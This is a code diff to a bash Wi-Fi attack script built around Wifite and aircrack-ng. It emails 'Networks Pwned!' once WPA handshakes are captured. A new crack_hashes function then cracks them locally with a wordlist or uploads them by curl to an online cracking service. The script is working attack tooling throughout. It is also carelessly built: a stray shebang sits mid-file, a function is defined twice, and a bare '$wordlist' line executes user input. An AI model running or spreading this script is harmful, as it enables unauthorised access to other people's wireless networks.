@@ -349,20 +349,161 @@ sudo ./Wifite.py
 
 crack () {
 echo "Handshakes have been captured!" | mail -s "Networks Pwned!" $email > /dev/null 2>&1
-echo "Your current directory:"
-pwd
-ls *.txt
-read -p "Enter path to wordlist : " wordlist
-$wordlist
-sudo aircrack-ng -w $wordlist *.cap 
-#sudo aircrack-ng -w wordlist.txt -b *.cap
-#sudo aircrack-ng -w $wordlist wep.cap
-#sudo aircrack-ng -w $wordlist wpa.cap
-#sudo aircrack-ng -w wordlist.txt wep.cap
-#sudo aircrack-ng -w wordlist.txt wpa.cap
-#sudo aircrack-ng -w wordlist.txt *.cap
 cleanup 
+crack_hashes
 }
+
+#!/bin/bash
+
+# Function to convert .cap file to .hccapx
+convert_cap_to_hccapx() {
+    # Check if hcxpcaptool is installed
+    if ! command -v hcxpcaptool &> /dev/null
+    then
+        echo "hcxpcaptool could not be found. Please install it first."
+        exit 1
+    fi
+
+    # Ensure the correct number of arguments is provided
+    if [ $# -ne 1 ]; then
+        echo "Usage: $0 <path-to-cap-file>"
+        exit 1
+    fi
+
+    # Input file (.cap)
+    cap_file="$1"
+
+    # Check if the file exists and is a .cap file
+    if [ ! -f "$cap_file" ]; then
+        echo "File $cap_file not found!"
+        exit 1
+    fi
+
+    if [[ "$cap_file" != *.cap ]]; then
+        echo "Please provide a .cap file!"
+        exit 1
+    fi
+
+    # Output file name (same as input file but with .hccapx extension)
+    hccapx_file="${cap_file%.cap}.hccapx"
+
+    # Convert the .cap file to .hccapx using hcxpcaptool
+    echo "Converting $cap_file to $hccapx_file..."
+    hcxpcaptool -z "$hccapx_file" "$cap_file"
+
+    if [ $? -eq 0 ]; then
+        echo "Conversion successful: $hccapx_file"
+    else
+        echo "Conversion failed!"
+        exit 1
+    fi
+}
+
+# Function to crack hashes locally or via cloud
+crack_hashes() {
+    # Ask user for input method
+    echo "Do you want to crack hashes on your device or with the cloud?"
+    select method in "Local (Device)" "Cloud (OnlineHashCrack)"; do
+        case $method in
+            "Local (Device)")
+                # Local cracking with Hashcat or other methods (you can extend this part)
+                echo "You have selected local cracking."
+                echo "Your current directory:"
+                pwd
+                ls *.txt
+                read -p "Enter path to wordlist : " wordlist
+                $wordlist
+                sudo aircrack-ng -w $wordlist *.cap 
+                break
+                ;;
+            "Cloud (OnlineHashCrack)")
+                # Ask for the user's email for cloud cracking
+                echo "Please provide your email for OnlineHashCrack service:"
+                read -p "Email: " user_email
+
+                if [[ -z "$user_email" ]]; then
+                    echo "Email cannot be empty. Exiting."
+                    exit 1
+                fi
+
+                # Convert the cap file to hccapx format
+                echo "Please provide the path to your .cap file:"
+                read -p "Path to .cap file: " cap_file
+
+                # Call the conversion function
+                convert_cap_to_hccapx "$cap_file"
+                hccapx_file="${cap_file%.cap}.hccapx"
+
+                # Upload to OnlineHashCrack
+                echo "Uploading $hccapx_file to OnlineHashCrack..."
+                response=$(curl -s -X POST https://www.onlinehashcrack.com/crack-wpa/ \
+                    -F "email=$user_email" \
+                    -F "file=@$hccapx_file" \
+                    -F "hash_type=wpa" \
+                    -F "submit=Submit")
+
+                # Check the response for success or failure
+                if [[ "$response" == *"Cracking started"* ]]; then
+                    echo "Cracking request submitted successfully."
+                else
+                    echo "Error submitting your request. Please try again."
+                    exit 1
+                fi
+                break
+                ;;
+            *)
+                echo "Invalid option. Please select either 'Local' or 'Cloud'."
+                ;;
+        esac
+    done
+}
+
+
+
+# Function to convert .cap file to .hccapx
+convert_cap_to_hccapx() {
+    # Check if hcxpcaptool is installed
+    if ! command -v hcxpcaptool &> /dev/null
+    then
+        echo "hcxpcaptool could not be found. Please install it first."
+        exit 1
+    fi
+
+    # Ensure the correct number of arguments is provided
+    if [ $# -ne 1 ]; then
+        echo "Usage: $0 <path-to-cap-file>"
+        exit 1
+    fi
+
+    # Input file (.cap)
+    cap_file="$1"
+
+    # Check if the file exists and is a .cap file
+    if [ ! -f "$cap_file" ]; then
+        echo "File $cap_file not found!"
+        exit 1
+    fi
+
+    if [[ "$cap_file" != *.cap ]]; then
+        echo "Please provide a .cap file!"
+        exit 1
+    fi
+
+    # Output file name (same as input file but with .hccapx extension)
+    hccapx_file="${cap_file%.cap}.hccapx"
+
+    # Convert the .cap file to .hccapx using hcxpcaptool
+    echo "Converting $cap_file to $hccapx_file..."
+    hcxpcaptool -z "$hccapx_file" "$cap_file"
+
+    if [ $? -eq 0 ]; then
+        echo "Conversion successful: $hccapx_file"
+    else
+        echo "Conversion failed!"
+        exit 1
+    fi
+}
+
 
 cleanup () {
 #$sudo airmon-ng stop $foo
